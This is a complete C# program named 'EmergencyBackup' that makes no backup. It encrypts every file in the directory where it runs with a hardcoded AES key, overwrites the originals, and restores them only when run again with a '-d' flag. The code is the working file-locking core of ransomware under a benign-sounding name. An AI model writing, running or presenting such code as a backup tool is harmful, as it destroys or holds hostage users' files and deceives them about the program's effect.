using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace EmergencyBackup
{
    class Program
    {
        // Fixed 16-byte (128-bit) AES key
        private static readonly byte[] AesKey = Encoding.UTF8.GetBytes("1337deadbeefdead");
        private static readonly string SelfName = Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);

        static void Main(string[] args)
        {
            try
            {
                // Check for mode argument
                bool decryptMode = args.Length > 0 && args[0].ToLower() == "-d";

                string currentDir = Directory.GetCurrentDirectory();
                Console.WriteLine($"{(decryptMode ? "Decrypting" : "Encrypting")} directory: {currentDir}");

                // Process all files in the directory
                foreach (string filePath in Directory.GetFiles(currentDir))
                {
                    string fileName = Path.GetFileName(filePath);

                    // Skip the program itself
                    if (fileName.Equals(SelfName, StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine($"Skipping self: {fileName}");
                        continue;
                    }

                    if (decryptMode)
                    {
                        Console.WriteLine($"Decrypting: {fileName}");
                        DecryptFile(filePath);
                    }
                    else
                    {
                        Console.WriteLine($"Encrypting: {fileName}");
                        EncryptAndOverwriteFile(filePath);
                    }
                }

                Console.WriteLine($"{(decryptMode ? "Decryption" : "Encryption")} process completed successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static void EncryptAndOverwriteFile(string filePath)
        {
            try
            {
                // Read original file content
                byte[] originalData = File.ReadAllBytes(filePath);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = AesKey;
                    aes.GenerateIV(); // Generate a random IV for each encryption
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    // Create encryptor
                    using (ICryptoTransform encryptor = aes.CreateEncryptor())
                    {
                        // Encrypt the data
                        byte[] encryptedData = encryptor.TransformFinalBlock(originalData, 0, originalData.Length);

                        // Combine IV and encrypted data
                        byte[] finalData = new byte[aes.IV.Length + encryptedData.Length];
                        Array.Copy(aes.IV, 0, finalData, 0, aes.IV.Length);
                        Array.Copy(encryptedData, 0, finalData, aes.IV.Length, encryptedData.Length);

                        // Overwrite original file with encrypted content
                        File.WriteAllBytes(filePath, finalData);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to encrypt {Path.GetFileName(filePath)}: {ex.Message}");
            }
        }

        static void DecryptFile(string filePath)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                
                // Check if file is long enough to contain IV
                if (fileData.Length < 16)
                {
                    Console.WriteLine($"File {Path.GetFileName(filePath)} is too short to be encrypted");
                    return;
                }

                // Extract IV (first 16 bytes) and encrypted data
                byte[] iv = new byte[16];
                byte[] encryptedData = new byte[fileData.Length - 16];
               Array.Copy(fileData, 0, iv, 0, 16);
                Array.Copy(fileData, 16, encryptedData, 0, encryptedData.Length);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = AesKey;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        byte[] decryptedData = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                        File.WriteAllBytes(filePath, decryptedData);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt {Path.GetFileName(filePath)}: {ex.Message}");
            }
        }
    }
} 
